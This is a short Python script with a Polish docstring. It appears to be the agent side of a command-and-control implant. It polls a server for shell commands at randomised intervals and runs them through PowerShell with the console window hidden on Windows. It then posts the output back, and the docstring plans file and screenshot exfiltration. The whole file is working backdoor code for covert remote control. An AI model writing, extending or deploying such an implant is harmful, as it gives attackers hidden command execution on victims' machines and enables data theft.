"""
Agent robi:
 - wypytuje co jakiś czas o komendy do wykonania
 - wykonuje komendy
 - zwraca status i stdout/stderr
 - randomowy czas między requestami
 - wysyłanie plików
 - robienie i wysyłanie screenshotów
"""

import time
import subprocess
import requests
import random
import platform

SERVER_IP = "127.0.0.1"
PORT = 5000
SERVER_URL = f"http://{SERVER_IP}:{PORT}/a"

def main():
    while True:
        try:
            result = requests.get(f"{SERVER_URL}/tasks", timeout=10)
            json = result.json()
            command = json.get("cmd", None)
        except KeyboardInterrupt:
            raise
        except Exception:
            continue
        if command:
            errored = False
            out = b""
            try:
                if platform.system() == "Windows":
                    process = subprocess.Popen(["powershell", "/c", command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                out, _ = process.communicate()
            except:
                errored = True
            requests.post(f"{SERVER_URL}/result", json={"id": json["id"], "stdout": out.decode(), "errored": errored}, headers={"Content-Type": "application/json"})

        sleep_time = random.randint(5, 20)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
